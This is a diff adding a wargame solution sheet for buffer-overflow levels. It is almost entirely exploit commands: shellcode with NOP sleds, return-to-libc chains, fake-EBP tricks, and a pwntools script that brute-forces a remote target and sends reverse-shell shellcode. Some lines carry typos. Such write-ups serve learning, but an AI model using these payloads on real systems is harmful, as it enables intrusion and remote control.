@@ -1,0 +1,189 @@
+## small buffer + gets / ENV again
+
+export sh=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
+
+'''
+#include<stdio.h>
+
+void main()
+{
+    printf("env addr : %x\n", getenv("sh"));
+}
+'''
+
+env addr : bffffeae
+
+(python -c 'print("A"*16+"BBBB"+"\xae\xfe\xff\xbf")'; cat) | ./goblin
+
+🐔 LEVEL4 (goblin -> orc) : egghunter
+./orc $(python -c 'print("A"*40+"BBBB"+"CCCC")')
+
+"\x90"*(40-24)+"x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+./orc $(python -c 'print("\x90"*(40-24)+"x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"BBBB"+"\xaa\xaa\xaa\xbf")')
+./orc $(python -c 'print("A"*40+"BBBB"+"\x50\xfc\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
+
+🐦 LEVEL5 (orc -> wolfman) : egghunter + bufferhunter
+
+./wolfman $(python -c 'print("A"*40+"BBBB"+"\x50\xfc\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
+
+🐒 LEVEL6 (wolfman -> darkelf) : check length of argv[1] + egghunter + bufferhunter
+
+argv[2]_addr : 0xbffffda8
+
+./darkelf $(python -c 'print("A"*40+"BBBB"+"\xa8\xfd\xff\xbf")') $(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
+
+🐎 LEVEL7 (darkelf -> orge) : check argv[0]
+
+argv[2]_addr : 0xbffffd74
+
+./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $(python -c 'print("A"*40+"BBBB"+"\x74\xfd\xff\xbf")') $(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
+
+🐘 LEVEL8 (orge -> troll) : check argc
+
+argv[0] nop slide addr = 0xbffffd29
+# 
+ln -s troll $(python -c 'print("\x90"*100+"\x31\xc0\x50\xba\x2e\x2e\x72\x67\x81\xc2\x01\x01\x01\x01\x52\xb9\x2e\x62\x69\x6e\x83\xc1\x01\x51\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+# Final payload
+./$(python -c 'print("\x90"*100+"\x31\xc0\x50\xba\x2e\x2e\x72\x67\x81\xc2\x01\x01\x01\x01\x52\xb9\x2e\x62\x69\x6e\x83\xc1\x01\x51\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")') $(python -c 'print("A"*40+"BBBB"+"\x29\xfd\xff\xbf")')
+
+🐩 LEVEL9 (troll -> vampire) : check 0xbfff
+
+argv[1]_nop_addr : 0xbffeec18
+
+./vampire $(python -c 'print("A"*40+"BBBB"+"\x18\xec\xfe\xbf"+"\x90"*70000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
+
+💝 LEVEL10 (vampire -> skeleton) : argv hunter
+
+argv[0] nop slide addr = 0xbfffff63
+./$(python -c 'print("\x90"*100+"\x31\xc0\x50\xba\x2e\x2e\x72\x67\x81\xc2\x01\x01\x01\x01\x52\xb9\x2e\x62\x69\x6e\x83\xc1\x01\x51\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")') $(python -c 'print("A"*40+"BBBB"+"\x93\xff\xff\xbf")')
+
+🐣 LEVEL11 (skeleton -> golem) : stack destroyer
+
+공유라이브러리 영역 공략
+
+library_addr = 0xbffff7a0
+
+gcc -fPIC -shared test.c -o $(python -c 'print("\x90"*100+"\x31\xc0\x50\xba\x2e\x2e\x72\x67\x81\xc2\x01\x01\x01\x01\x52\xb9\x2e\x62\x69\x6e\x83\xc1\x01\x51\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+
+export LD_PRELOAD
+export LD_PRELOAD=$(python -c 'print("/home/skeleton/"+"\x90"*100+"\x31\xc0\x50\xba\x2e\x2e\x72\x67\x81\xc2\x01\x01\x01\x01\x52\xb9\x2e\x62\x69\x6e\x83\xc1\x01\x51\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+
+./golem $(python -c 'print("A"*40+"BBBB"+"\xa0\xf7\xff\xbf")')
+
+🐤 LEVEL12 (golem -> darkknight) : sfp
+
+nop_slide_addr = 0xbffffe10
+
+FPO
+./darkknight $(python -c 'print("\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x04")')
+
+🐥 LEVEL13 (darkknight -> bugbear) : RTL1
+
+# RTL1 이 문제 힌트라는 것은, RET를 system 으로 변조하고 dummy 4bytes를 지나서 "/bin/sh" 문자열 주소를 주면 끝
+
+gadget list
+(1) system_addr = 0x40058ae0
+(2) "/bin/sh"_addr = 0xbffffc98
+
+./bugbear $(python -c 'print("\x90"*40+"BBBB"+"\xa0\x9a\x05\x40"+"DDDD"+"\x88\xfc\xff\xbf"+"/bin/sh")')
+
+🐔 LEVEL14 (bugbear -> giant) : RTL2, only execve
+
+libc_addr = 0x40018000
+execve_offset = 0x00091d48
+execve_addr = 0x400a9d48
+system_addr = 0x40058ae0
+
+2가지 방법
+1번 execve를 바로 실행
+execve의 인자는 3개
+0 : RET dummy
+1 : "/bin/sh" = 0xbffffc98 + 0x8 -> 0xbffffca0
+2 : {"/bin/sh", 0} = 
+3 : NULL
+
+2번 execve를 돌리고 ret를 system으로 줘버리기
+0 : system_addr
+1 : dummy 4bytes
+2 : "/bin/sh" = 0xbffffc9c 0xbffffcac
+
+./giant "$(python -c 'print("A"*40+"BBBB"+"\x48\x9d\x0a\x40"+"\xe0\x8a\x05\x40"+"BBBB"+"\xac\xfc\xff\xbf"+"/bin/sh")')"
+
+🐦 LEVEL15 (giant -> assassin) : no stack, no RTL
+
+# no stack no RTL ? 가장 먼저 떠오르는 것은 ? got overwrite?
+
+# double RET
+original RET : 0x0804851e
+RET보다 더 뒤 "\x90" addr : 0xbffffc56
+
+./assassin $(python -c 'print("A"*40+"BBBB"+"\x1e\x85\x04\x08"+"\x56\xfc\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80o")')
+
+💝 LEVEL16 (assassin -> zombie_assassin) : fake ebp
+
+# double leave
+original leave : 0x080484df
+buffer addr : 0xbffffc60
+buffer addr + 0x4 : 0xbffffc64
+buffer addr - 0x4 : 0xbffffc5c
+
+./zombie_assassin $(python -c 'print("\x64\xfc\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x5c\xfc\xff\xbf"+"\xdf\x84\x04\x08")')
+
+🐣 LEVEL17 (zombie_assassin -> succubus) : function calls
+
+# function chaining
+
+DO_addr : 0x080487ec
+GYE_addr : 0x080487bc
+GUL_addr : 0x0804878c
+YUT_addr : 0x0804875c
+MO_addr : 0x08048724
+"/bin/sh"_addr : 0xbffffc68
+
+./succubus $(python -c 'print("A"*40+"BBBB"+"\xec\x87\x04\x08"+"\xbc\x87\x04\x08"+"\x8c\x87\x04\x08"+"\x5c\x87\x04\x08"+"\x24\x87\x04\x08"+"BBBB"+"\x68\xfc\xff\xbf"+"/bin/sh")')
+
+🐤 LEVEL18 (succubus -> nightmare) : plt
+
+# 이거야말로 got overwrite!! -> 또 아니네 ㅋㅋㅋ
+
+buf_addr = 0xbffffab0
+buf_addr + 48 (strcpy's RET) = 0xbffffae0
+shellcode_addr = 0xbffffab4
+strcpy_addr = 0x08048410
+
+./nightmare $(python -c 'print("\xb4\xfa\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*12+"BBBB"+"\x10\x84\x04\x08"+"CCCC"+"\xe0\xfa\xff\xbf"+"\xb0\xfa\xff\xbf")')
+
+🐥 LEVEL19 (nightmare -> xavius) : fgets + destroyers
+
+# stdin 또한 하나의 공간이며 이 위치에 shellcode 주입하여 실행도 가능하다
+
+stdin_start_addr = 0x40105000
+
+(python -c 'print("\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"BBBB"+"\x00\x50\x01\x40")';cat) | ./xavius
+
+💝 LEVEL20 (xavius -> death_knight) : remote BOF
+
+# reverse shellcode & bruteforce RET
+
+from pwn import *
+ 
+SHELLCODE="\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"\
+    "\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x01\x70\x66\x68"\
+    "\x1f\x2b\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"\
+    "\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"\
+    "\x89\xe1\xb0\x0b\xcd\x80"
+ 
+ 
+ 
+for i in range (0xFF,0x00,-1):
+    for j in range(0x00,0xFF,10):
+        p = remote("192.168.1.58",6666)
+        print str(hex(u32(chr(j)+chr(i)+"\xff\xbf")))
+        payload = "A"*44
+        payload += chr(j)+chr(i)+"\xff\xbf"
+        payload += "\x90"*100
+        payload += SHELLCODE
+        p.send(payload)
+        p.close()
+
+# nc -lvp 7979
